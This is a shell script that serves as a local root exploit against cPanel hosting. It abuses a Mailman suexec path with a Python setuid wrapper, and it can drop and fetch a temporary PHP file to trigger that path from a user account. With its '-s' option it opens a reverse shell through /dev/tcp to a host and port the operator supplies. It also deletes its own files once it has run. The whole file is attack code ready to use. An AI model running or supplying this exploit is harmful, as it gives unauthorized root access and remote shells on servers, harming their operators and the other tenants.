#!/bin/sh

PWD=`pwd`
WDIR=$PWD
USER=`id -un`
HOME="/home/$USER"
PHP_SCRIPT="$HOME/public_html/info.php"
PHP_URL_PATH="/~$USER/info.php"
PY_SCRIPT="$PWD/wrap"

if [[ $# = 0 ]]; then
cat 1>&2 <<END
Usage: $0 ( -s IP PORT | CMD )
END
exit -1
fi

if [[ `id -ru` == 0 ]]; then
    echo "Error"
    exit -1
fi

if [ "$1" == "-s" ]; then
    CMD="/bin/sh < /dev/tcp/$2/$3 >&0 2>&0 &"
else
    CMD="cd $PWD; $* 2>&1"
fi

function finish {
    [[ -e $PY_SCRIPT ]] && rm -f $PY_SCRIPT
    [[ -e $PHP_SCRIPT ]] && rm -f $PHP_SCRIPT
    cd $WDIR
    exit $1
}

X=1
while [[ -e $PY_SCRIPT ]]; do
    PY_SCRIPT="$PWD/wrap$X"
    X=$(( $X + 1 ))
done

cat > $PY_SCRIPT <<END
import os
os.setgid(0)
os.setuid(0)
os.execl("/bin/sh", "/bin/sh", "-c", "$CMD")
END
    
if [[ $USER == "nobody" ]]; then
  cd /usr/local/cpanel/3rdparty/mailman/bin 
  /usr/local/apache/bin/suexec mailman mailman config_list -c -i $PY_SCRIPT mailman
else
    if [[ ! -d "$HOME/public_html" ]]; then
        echo "Error"
	finish -1
    fi
    X=1
    while [[ -e $PHP_SCRIPT ]]; do
        PHP_SCRIPT="$HOME/public_html/info$X.php"
	PHP_URL_PATH="/~$USER/info$X.php"
        X=$(( $X + 1 ))
    done

    cat > $PHP_SCRIPT <<END
<?php 
exec("cd /usr/local/cpanel/3rdparty/mailman/bin; /usr/local/apache/bin/suexec mailman mailman config_list -c -i $PY_SCRIPT mailman", \$out); 
print join("\n", \$out);
print "\n";
?>
END
    chmod 604 $PHP_SCRIPT    
    
    CURL=`which curl 2> /dev/null`
    WGET=`which wget 2> /dev/null`
    if [[ -x $CURL ]]; then
        curl -s "http://localhost$PHP_URL_PATH"
    elif [[ -x $WGET ]]; then
        wget -q -O - "http://localhost$PHP_URL_PATH"
    else
        cat > /dev/tcp/127.0.0.1/80 <<END
GET $PHP_URL_PATH HTTP/1.1
Host: localhost
 

END
        # give time for script to complete since we don't see response
        sleep 2
    fi
fi

finish 0
